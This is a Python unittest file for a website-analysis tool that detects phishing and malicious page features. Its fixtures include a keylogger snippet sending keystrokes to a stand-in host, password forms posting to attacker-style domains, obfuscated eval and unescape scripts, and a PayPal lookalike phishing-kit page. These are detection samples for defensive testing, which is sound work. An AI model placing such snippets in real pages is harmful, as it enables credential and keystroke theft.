import unittest

from analysis.http_fetch import FetchResult
from analysis.website_analysis import analyze_html, analyze_scripts, analyze_website

URL = "https://shop.example.com/page"


def A(html, url=URL):
    return analyze_html(html, url)


def ids(r):
    return {f["id"] for f in r["findings"]}


class FormTests(unittest.TestCase):
    def test_benign_page(self):
        r = A('<html><head><title>Shop</title></head><body><h1>Welcome</h1><form action="/search"><input type="text" name="q"></form><script src="/app.js"></script></body></html>')
        self.assertEqual((r["title"], r["headings"], r["forms"]["count"], r["forms"]["login_form"], r["forms"]["external_action"], r["findings"]), ("Shop", ["Welcome"], 1, False, False, []))

    def test_password_and_login_form(self):
        r = A('<form action="/login" method="POST"><input name="u"><input type="password" name="p"></form>')
        self.assertEqual((r["password_fields"], r["forms"]["login_form"], r["forms"]["items"][0]["method"], r["forms"]["items"][0]["has_password"]), (1, True, "post", True))
        self.assertIn("login_form", ids(r))
        self.assertTrue(A('<div><input type="password"></div>')["forms"]["login_form"])  # password field outside any <form>

    def test_external_form_action_variants(self):
        for action in ["https://evil.example.net/p.php", "//evil.example.net/p", "http://evil.example.net/p"]:
            r = A(f'<form action="{action}"><input type="password"></form>')
            self.assertTrue(r["forms"]["external_action"], action)
            self.assertIn("external_form_action", ids(r))
        for action in ["", "/submit", "submit.php", "https://shop.example.com/x", "https://pay.example.com/x"]:  # subdomains of the same registered domain are fine
            self.assertFalse(A(f'<form action="{action}"><input></form>')["forms"]["external_action"], action)

    def test_base_href_changes_resolution(self):
        r = A('<base href="https://evil.example.net/"><form action="login"><input type="password"></form>')
        self.assertTrue(r["forms"]["external_action"])

    def test_unusual_form_actions_and_insecure_submit(self):
        self.assertIn("unusual_form_action", ids(A('<form action="javascript:void(0)"><input></form>')))
        self.assertIn("unusual_form_action", ids(A('<form action="mailto:a@b.co"><input></form>')))
        r = A('<form action="http://shop.example.com/login"><input type="password"></form>')
        self.assertIn("insecure_form_submit", ids(r))
        self.assertFalse(r["forms"]["external_action"])


class IframeAndHiddenTests(unittest.TestCase):
    def test_hidden_iframes(self):
        for tag in ['<iframe src="https://x.example.net" style="display:none"></iframe>', '<iframe src="https://x.example.net" width="0" height="0"></iframe>', '<iframe src="https://x.example.net" hidden></iframe>',
                    '<iframe src="https://x.example.net" style="visibility: hidden"></iframe>']:
            r = A(tag)
            self.assertEqual((r["iframes"]["count"], r["iframes"]["hidden"], r["iframes"]["external"]), (1, 1, 1), tag)
            self.assertIn("hidden_iframe", ids(r))

    def test_visible_external_iframe_is_low_severity(self):
        r = A('<iframe src="https://video.example.net/embed" width="560" height="315" sandbox></iframe>')
        self.assertEqual((r["iframes"]["hidden"], r["iframes"]["external"], r["iframes"]["items"][0]["sandboxed"]), (0, 1, True))
        self.assertEqual(ids(r), {"external_iframe"})
        self.assertEqual(A('<iframe src="/inner"></iframe>')["iframes"]["external"], 0)

    def test_hidden_elements_counted(self):
        r = A('<head><style>.x{display:none}</style></head><body><input type="hidden" name="a"><input type="hidden" name="b"><div style="display:none">x</div><p hidden>y</p><span style="opacity:0">z</span><p style="color:red">ok</p></body>')
        self.assertEqual(r["hidden_elements"], {"hidden_inputs": 2, "styled_hidden": 3, "total": 5})

    def test_many_hidden_elements_finding(self):
        self.assertIn("many_hidden_elements", ids(A("".join(f'<input type="hidden" name="h{i}">' for i in range(12)))))


class ScriptTests(unittest.TestCase):
    def test_benign_script_is_not_suspicious(self):
        self.assertFalse(analyze_scripts("window.dataLayer=[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date());")["is_suspicious"])

    def test_each_suspicious_pattern(self):
        cases = {"eval_with_decoder": 'eval(atob("ZG9jdW1lbnQ="))', "document_write_unescape": 'document.write(unescape("%3Cscript"))', "hex_escaped_strings": "var a='" + "\\x41" * 25 + "';",
                 "base64_blob": 'var d="' + "QUJD" * 70 + '";', "possible_keylogger": 'document.addEventListener("keydown",function(e){fetch("//x.io/?k="+e.key)})', "minified_blob": "a=" + "1;" * 2000}
        for reason, js in cases.items():
            self.assertIn(reason, analyze_scripts(js)["suspicious_reasons"], reason)

    def test_key_listener_alone_or_eval_alone_is_not_enough(self):
        self.assertFalse(analyze_scripts('document.addEventListener("keydown",function(e){console.log(e.key)})')["is_suspicious"])
        self.assertFalse(analyze_scripts('eval("1+1")')["is_suspicious"])

    def test_page_level_script_findings(self):
        r = A('<script src="https://cdn.other-site.net/a.js"></script><script>eval(unescape("%61"))</script><script>document.cookie="a=1"</script>')
        self.assertEqual(r["scripts"]["external_hosts"], ["cdn.other-site.net"])
        self.assertIn("suspicious_scripts", ids(r))
        self.assertEqual(A('<script src="https://assets.example.com/a.js"></script>')["scripts"]["external_hosts"], [])

    def test_inline_script_size_is_capped(self):
        r = A("<script>" + "var a=1;" * 100_000 + "</script>")
        self.assertLessEqual(r["scripts"]["inline_chars"], 210_000)


class RedirectAndMiscTests(unittest.TestCase):
    def test_meta_refresh(self):
        r = A('<meta http-equiv="refresh" content="0; url=https://evil.example.net/x">')
        self.assertEqual(r["client_side_redirect"]["meta_refresh"], "https://evil.example.net/x")
        self.assertIn("meta_refresh_redirect", ids(r))
        self.assertIsNone(A('<meta http-equiv="refresh" content="30">')["client_side_redirect"]["meta_refresh"])

    def test_javascript_redirect_and_right_click(self):
        r = A('<body oncontextmenu="return false"><script>window.location.href="https://evil.example.net"</script></body>')
        self.assertTrue(r["client_side_redirect"]["javascript"] and r["right_click_blocked"])
        self.assertTrue({"javascript_redirect", "right_click_blocked"} <= ids(r))

    def test_metadata_extraction(self):
        r = A('<title>  PayPal: Log in </title><meta property="og:site_name" content="PayPal"><h1>Log in to PayPal</h1><h2>Secure</h2>')
        self.assertEqual((r["title"], r["site_name"], r["headings"]), ("PayPal: Log in", "PayPal", ["Log in to PayPal", "Secure"]))

    def test_malformed_html_does_not_crash(self):
        for h in ["", "<", "<<<>>>", "<form><input", "<iframe src=>", "\x00\x01<b>", "<script>" + "x" * 10, "<div " * 500, "&#xZZ;<title>"]:
            self.assertIn("forms", A(h))


class AnalyzeWebsiteTests(unittest.TestCase):
    def fr(self, **kw):
        base = dict(url="https://shop.example.com/", final_url="https://shop.example.com/", status=200, content_type="text/html", body=b"<title>Hi</title>", headers={"content-type": "text/html"})
        return FetchResult(**{**base, **kw})

    def test_not_requested_and_failed(self):
        self.assertEqual(analyze_website(None, "example.com")["status"], "skipped")
        r = analyze_website(FetchResult(url="x", blocked="private_address"), "example.com")
        self.assertEqual((r["status"], r["error"], r["fetched"]), ("failed", "private_address", False))
        self.assertEqual(analyze_website(FetchResult(url="x", error="timeout"), "example.com")["status"], "failed")

    def test_ok_page(self):
        r = analyze_website(self.fr(), "example.com")
        self.assertEqual((r["status"], r["fetched"], r["title"], r["http_status"]), ("ok", True, "Hi", 200))

    def test_download_is_reported_not_read(self):
        r = analyze_website(self.fr(body=None, is_download=True, content_type="application/zip"), "example.com")
        self.assertEqual((r["status"], r["page"]), ("ok", None))
        self.assertIn("download_content", ids(r))

    def test_redirect_findings(self):
        chain = [{"from": "a", "to": "b", "status": 302, "cross_domain": True}] * 3
        r = analyze_website(self.fr(redirects=chain, final_url="https://other.net/"), "example.com")
        self.assertTrue({"long_redirect_chain", "cross_domain_redirect"} <= ids(r))
        self.assertTrue(r["redirects"]["ends_on_different_domain"])

    def test_untrusted_tls_and_charset(self):
        self.assertIn("untrusted_tls", ids(analyze_website(self.fr(tls_verified=False), "example.com")))
        r = analyze_website(self.fr(body="<title>Café</title>".encode("latin-1"), headers={"content-type": "text/html; charset=iso-8859-1"}), "example.com")
        self.assertEqual(r["title"], "Café")
        self.assertEqual(analyze_website(self.fr(body=b"<title>x</title>", headers={"content-type": "text/html; charset=bogus-9"}), "example.com")["title"], "x")

    def test_phishing_kit_page(self):
        html = b'<title>PayPal - Log in</title><form action="https://c.evil.ru/p"><input type="password"></form><iframe src="https://t.evil.ru" width="0" height="0"></iframe><script>eval(atob("x"))</script>'
        r = analyze_website(self.fr(body=html), "paypa1-login.com")
        self.assertTrue({"login_form", "external_form_action", "hidden_iframe", "suspicious_scripts"} <= ids(r))


if __name__ == "__main__":
    unittest.main()
